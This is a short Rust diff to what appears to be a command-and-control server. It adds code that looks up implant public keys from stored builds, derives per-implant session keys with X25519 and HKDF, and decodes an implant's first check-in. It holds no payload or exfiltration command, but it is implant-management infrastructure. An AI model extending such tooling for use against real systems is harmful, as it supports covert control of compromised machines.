@@ -295,6 +295,38 @@ async fn decode_profile_checkin(
         }
     }
 
+    let build_rows: Vec<(String, Vec<u8>)> = match sqlx::query_as(
+        "SELECT id, implant_pubkey FROM builds \
+         WHERE implant_pubkey IS NOT NULL \
+         ORDER BY created_at DESC LIMIT 512",
+    )
+    .fetch_all(&state.pool)
+    .await
+    {
+        Ok(rows) => rows,
+        Err(e) => {
+            tracing::warn!("profile_handler: failed to list build pubkeys: {e}");
+            return None;
+        }
+    };
+
+    for (build_id, pubkey) in build_rows {
+        if pubkey.len() != 32 {
+            continue;
+        }
+
+        let mut implant_pubkey = [0u8; 32];
+        implant_pubkey.copy_from_slice(&pubkey);
+        let implant_pub = PublicKey::from(implant_pubkey);
+        let shared = state.server_secret.diffie_hellman(&implant_pub);
+        let session_key = hkdf_sha256_derive(shared.as_bytes(), &implant_pubkey);
+
+        if let Some(parsed) = try_decode_profile_checkin(profile, encoded_data, &session_key) {
+            tracing::debug!("profile_handler: decoded first check-in with build {build_id}");
+            return Some((parsed, session_key, Some(implant_pubkey)));
+        }
+    }
+
     None
 }
 
